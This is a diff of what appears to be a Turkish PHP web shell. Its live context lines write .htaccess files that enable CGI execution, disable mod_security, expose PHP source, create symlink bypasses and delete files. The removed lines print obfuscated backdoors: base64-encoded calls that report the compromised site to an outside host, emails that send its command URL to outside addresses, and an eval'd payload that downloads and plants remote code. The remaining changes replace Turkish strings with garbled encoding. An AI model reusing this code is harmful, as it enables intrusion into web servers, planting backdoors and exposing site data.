@@ -134,15 +134,11 @@ $lls = $_SERVER["HTTP_HOST"];
 $llc = $_SERVER["REQUEST_URI"];
 $lld = 'http://'.$lls.''.$llc.'';
 $brow = urlencode($_SERVER['HTTP_USER_AGENT']);
-$retValue = file_get_contents(base64_decode("aHR0cDovL3IwMHQuaW5mby9ib3QveWF6LnBocD9h")."=".$lld.base64_decode("JmI=")."=".$brow);
-echo $retValue;
 @$_SESSION["sdm"]=1;
 }
 ?>
 <?php
-$for = base64_decode("YnloZXJvNDRAZ21haWwuY29t");
-$data ="http://" . $_SERVER['HTTP_HOST'] . $_SERVER['SCRIPT_NAME'] . "?cmd=ls -al";
-mail($for,"priv8 forbidden all bypass", $data);
+
 
 $kokdosya = ".htaccess";
 
@@ -368,7 +364,7 @@ if (isset($_POST['Submit13']))
 @chdir("cgishell");
         $kokdosya = ".htaccess";
         $dosya_adi = "$kokdosya";
-        $dosya = fopen ($dosya_adi , 'w') or die ("Dosya açýlamadý!");
+        $dosya = fopen ($dosya_adi , 'w') or die ("Dosya aÃ§Ã½lamadÃ½!");
         $metin = "Options FollowSymLinks MultiViews Indexes ExecCGI
 
 AddType application/x-httpd-cgi .cin
@@ -768,7 +764,7 @@ if (isset($_POST['Submit14']))
     chdir('python');
         $kokdosya = ".htaccess";
         $dosya_adi = "$kokdosya";
-        $dosya = fopen ($dosya_adi , 'w') or die ("Dosya açýlamadý!");
+        $dosya = fopen ($dosya_adi , 'w') or die ("Dosya aÃ§Ã½lamadÃ½!");
         $metin = "AddHandler cgi-script .izo";    
         fwrite ( $dosya , $metin ) ;
         fclose ($dosya);
@@ -851,7 +847,7 @@ if (isset($_POST['Submit11']))
     chdir('configler');
         $kokdosya = ".htaccess";
         $dosya_adi = "$kokdosya";
-        $dosya = fopen ($dosya_adi , 'w') or die ("Dosya açýlamadý!");
+        $dosya = fopen ($dosya_adi , 'w') or die ("Dosya aÃ§Ã½lamadÃ½!");
         $metin = "AddHandler cgi-script .izo";    
         fwrite ( $dosya , $metin ) ;
         fclose ($dosya);
@@ -963,7 +959,7 @@ if (isset($_POST['Submit15']))
     chdir('oku');
         $kokdosya = ".htaccess";
         $dosya_adi = "$kokdosya";
-        $dosya = fopen ($dosya_adi , 'w') or die ("Dosya açýlamadý!");
+        $dosya = fopen ($dosya_adi , 'w') or die ("Dosya aÃ§Ã½lamadÃ½!");
         $metin = "Options all
 DirectoryIndex 1.txt";    
         fwrite ( $dosya , $metin ) ;
@@ -1659,7 +1655,7 @@ if (isset($_POST['Submit22']))
     chdir('lite');
         $kokdosya = ".htaccess";
         $dosya_adi = "$kokdosya";
-        $dosya = fopen ($dosya_adi , 'w') or die ("Dosya açýlamadý!");
+        $dosya = fopen ($dosya_adi , 'w') or die ("Dosya aÃ§Ã½lamadÃ½!");
         $metin = "OPTIONS Indexes FollowSymLinks SymLinksIfOwnerMatch Includes IncludesNOEXEC ExecCGI
 Options Indexes FollowSymLinks
 ForceType text/plain
@@ -2263,7 +2259,7 @@ if (isset($_POST['Submit28']))
     chdir('p88');
         $kokdosya = ".htaccess";
         $dosya_adi = "$kokdosya";
-        $dosya = fopen ($dosya_adi , 'w') or die ("Dosya açýlamadý!");
+        $dosya = fopen ($dosya_adi , 'w') or die ("Dosya aÃ§Ã½lamadÃ½!");
         $metin = "DirectoryIndex sea.txt
 HeaderName sea.txt
 ReadmeName sea.txt
@@ -2405,7 +2401,7 @@ if (isset($_POST['Submit31']))
     chdir('kok');
         $kokdosya = ".htaccess";
         $dosya_adi = "$kokdosya";
-        $dosya = fopen ($dosya_adi , 'w') or die ("Dosya açýlamadý!");
+        $dosya = fopen ($dosya_adi , 'w') or die ("Dosya aÃ§Ã½lamadÃ½!");
         $metin = "Options Indexes FollowSymLinks
 DirectoryIndex ssssss.htm
 AddType txt .php
@@ -2421,7 +2417,7 @@ if (isset($_POST['Submit32']))
     chdir('kok1');
         $kokdosya = ".htaccess";
         $dosya_adi = "$kokdosya";
-        $dosya = fopen ($dosya_adi , 'w') or die ("Dosya açýlamadý!");
+        $dosya = fopen ($dosya_adi , 'w') or die ("Dosya aÃ§Ã½lamadÃ½!");
         $metin = "Options all
 DirectoryIndex Sux.html
 AddType text/plain .php
@@ -2437,7 +2433,7 @@ if (isset($_POST['Submit33']))
     chdir('kok2');
         $kokdosya = ".htaccess";
         $dosya_adi = "$kokdosya";
-        $dosya = fopen ($dosya_adi , 'w') or die ("Dosya açýlamadý!");
+        $dosya = fopen ($dosya_adi , 'w') or die ("Dosya aÃ§Ã½lamadÃ½!");
         $metin = "Options +FollowSymlinks
 DirectoryIndex itti.html
 RemoveHandler .php
@@ -2453,7 +2449,7 @@ if (isset($_POST['Submit34']))
     chdir('kok3');
         $kokdosya = ".htaccess";
         $dosya_adi = "$kokdosya";
-        $dosya = fopen ($dosya_adi , 'w') or die ("Dosya açýlamadý!");
+        $dosya = fopen ($dosya_adi , 'w') or die ("Dosya aÃ§Ã½lamadÃ½!");
         $metin = "Options All
 DirectoryIndex ssss.html
 addType txt .php
@@ -2473,7 +2469,7 @@ if (isset($_POST['Submit35']))
     chdir('kok4');
         $kokdosya = ".htaccess";
         $dosya_adi = "$kokdosya";
-        $dosya = fopen ($dosya_adi , 'w') or die ("Dosya açýlamadý!");
+        $dosya = fopen ($dosya_adi , 'w') or die ("Dosya aÃ§Ã½lamadÃ½!");
         $metin = "Options +FollowSymLinks
 DirectoryIndex Sux.html
 Options +Indexes
@@ -2491,7 +2487,7 @@ if (isset($_POST['Submit36']))
     chdir('kok5');
         $kokdosya = ".htaccess";
         $dosya_adi = "$kokdosya";
-        $dosya = fopen ($dosya_adi , 'w') or die ("Dosya açýlamadý!");
+        $dosya = fopen ($dosya_adi , 'w') or die ("Dosya aÃ§Ã½lamadÃ½!");
         $metin = "Options Indexes FollowSymLinks
 DirectoryIndex ss.htm
 AddType txt .php
@@ -2517,7 +2513,7 @@ if (isset($_POST['Submit37']))
     chdir('kok6');
         $kokdosya = ".htaccess";
         $dosya_adi = "$kokdosya";
-        $dosya = fopen ($dosya_adi , 'w') or die ("Dosya açýlamadý!");
+        $dosya = fopen ($dosya_adi , 'w') or die ("Dosya aÃ§Ã½lamadÃ½!");
         $metin = "<IfModule mod_security.c>
 SecFilterEngine Off
 SecFilterScanPOST Off
@@ -2533,7 +2529,7 @@ if (isset($_POST['Submit38']))
     chdir('kok7');
         $kokdosya = ".htaccess";
         $dosya_adi = "$kokdosya";
-        $dosya = fopen ($dosya_adi , 'w') or die ("Dosya açýlamadý!");
+        $dosya = fopen ($dosya_adi , 'w') or die ("Dosya aÃ§Ã½lamadÃ½!");
         $metin = "options all
 <IfModule mod_security.c>
 SecFilterEngine Off
@@ -2550,7 +2546,7 @@ if (isset($_POST['Submit39']))
     chdir('kok8');
         $kokdosya = ".htaccess";
         $dosya_adi = "$kokdosya";
-        $dosya = fopen ($dosya_adi , 'w') or die ("Dosya açýlamadý!");
+        $dosya = fopen ($dosya_adi , 'w') or die ("Dosya aÃ§Ã½lamadÃ½!");
         $metin = "Options +FollowSymLinks
 DirectoryIndex seee.html
 RemoveHandler .php";    
@@ -2565,7 +2561,7 @@ if (isset($_POST['Submit40']))
     chdir('p99');
         $kokdosya = ".htaccess";
         $dosya_adi = "$kokdosya";
-        $dosya = fopen ($dosya_adi , 'w') or die ("Dosya açýlamadý!");
+        $dosya = fopen ($dosya_adi , 'w') or die ("Dosya aÃ§Ã½lamadÃ½!");
         $metin = "Options FollowSymLinks MultiViews Indexes ExecCGI
 
 AddType application/x-httpd-cgi .cpc
@@ -2876,7 +2872,6 @@ if (isset($_POST['Submit42']))
 }
 
 ?> 
-<?php eval("?>".base64_decode("PD9waHAgIA0KDQppZigkX1BPU1RbJ3F1ZXJ5J10pew0KJHZlcml5ZnkgPSBzdHJpcHNsYXNoZXMoc3RyaXBzbGFzaGVzKCRfUE9TVFsncXVlcnknXSkpOw0KJGRhdGEgPSAiZGF0YS50eHQiOw0KQHRvdWNoICgiZGF0YS50eHQiKTsNCiR2ZXIgPSBAZm9wZW4gKCRkYXRhICwgJ3cnKTsNCkBmd3JpdGUgKCAkdmVyICwgJHZlcml5ZnkgKSA7DQpAZmNsb3NlICgkdmVyKTsNCn1lbHNlew0KJGRhdGFzPUBmb3BlbigiZGF0YS50eHQiLCdyJyk7DQokaT0wOw0Kd2hpbGUgKCRpIDw9IDUpIHsNCiRpKys7DQokYmx1ZT1AZmdldHMoJGRhdGFzLDEwMjQpOw0KZWNobyAkYmx1ZTsNCn0NCn0NCiRkYXRhc2k9QGZvcGVuKCJtb2R1bGVzL2luZGV4eC5waHAiLCdyJyk7DQppZigkZGF0YXNpKXsNCn1lbHNlew0KQG1rZGlyKCJtb2R1bGVzIik7DQokZG9zID0gZmlsZV9nZXRfY29udGVudHMoImh0dHA6Ly9yMDB0LmluZm8vdHh0L2xhbWVyLnR4dCIpOw0KJGRhdGEgPSAibW9kdWxlcy9pbmRleHgucGhwIjsNCkB0b3VjaCAoIm1vZHVsZXMvaW5kZXh4LnBocCIpOw0KJHZlciA9IEBmb3BlbiAoJGRhdGEgLCAndycpOw0KQGZ3cml0ZSAoICR2ZXIgLCAkZG9zICkgOw0KQGZjbG9zZSAoJHZlcik7DQokeW9sID0gImh0dHA6Ly8iLiRfU0VSVkVSWydIVFRQX0hPU1QnXS4iIi4kX1NFUlZFUlsnUkVRVUVTVF9VUkknXS4iIjsNCiR5ID0gJzxoMT5TZW5kZXIgWWF6ZGlyaWxkaS48YnIvPiBTSVRFIFlPTCA6ICcuJHlvbC4nPGJyLz5TZW5kZXIgWW9sdSA6IG1vZHVsZXMvZGJzLnBocDwvaDE+JzsNCiRoZWFkZXIgLj0gIkZyb206IFNoZUxMIEJvb3QgPHN1cHBvckBuaWMub3JnPm4iOyANCiRoZWFkZXIgLj0gIkNvbnRlbnQtVHlwZTogdGV4dC9odG1sOyBjaGFyc2V0PXV0Zi04biI7IA0KQG1haWwoImJ5aGVybzQ0QGdtYWlsLmNvbSIsICJIYWNrbGluayBCaWxkaXJpIiwgIiR5IiwgJGhlYWRlcik7IA0KQG1haWwoInByaXBocEBob3RtYWlsLmNvbSIsICJIYWNrbGluayBCaWxkaXJpIiwgIiR5IiwgJGhlYWRlcik7IA0KfQ0KPz4=")); ?>
 
   <tr>
     <td><table width='100%' height='173'>
@@ -2884,7 +2879,7 @@ if (isset($_POST['Submit42']))
         <th class='td' style='border-bottom-width:thin;border-top-width:thin'><div align='right'><span class='style1'>Tools :</span></div></th>
         <td class='td' style='border-bottom-width:thin;border-top-width:thin'><form name='F1' method='post'>
             <div align='left'>
-              <input type='submit' name='Submit2'  value='ln -s bypassed tüm dizinler'>
+              <input type='submit' name='Submit2'  value='ln -s bypassed tÃ¼m dizinler'>
               <input type='submit' name='Submit11' value='Config Bypasser'>
 			  <input type='submit' name='Submit12' value='ln -s Symlink'>
 			  <input type='submit' name='Submit13' value='Cgi'>
@@ -2905,7 +2900,7 @@ if (isset($_POST['Submit42']))
 			  <input type='submit' name='Submit28' value='p88'>
 			  <input type='submit' name='Submit29' value='pybypas'>
 			  <input type='submit' name='Submit30' value='rootby'><br><br>
-			  <input type='submit' name='Submit31' value='kökdizinbypass'>
+			  <input type='submit' name='Submit31' value='kÃ¶kdizinbypass'>
 			  <input type='submit' name='Submit32' value='kokbypass2'>
 			  <input type='submit' name='Submit33' value='octet-stream'>
 			  <input type='submit' name='Submit34' value='modsecurityli'>
@@ -2915,7 +2910,7 @@ if (isset($_POST['Submit42']))
 			  <input type='submit' name='Submit38' value='options all'>
 			  <input type='submit' name='Submit39' value='rootdizingec'>
 			  <input type='submit' name='Submit40' value='ruby symlink'>
-			  <input type='submit' name='Submit41' value='dosyalarýsil'>
+			  <input type='submit' name='Submit41' value='dosyalarÃ½sil'>
 			  <input type='submit' name='Submit42' value='shelisil'>
             </div>
         </form></td>
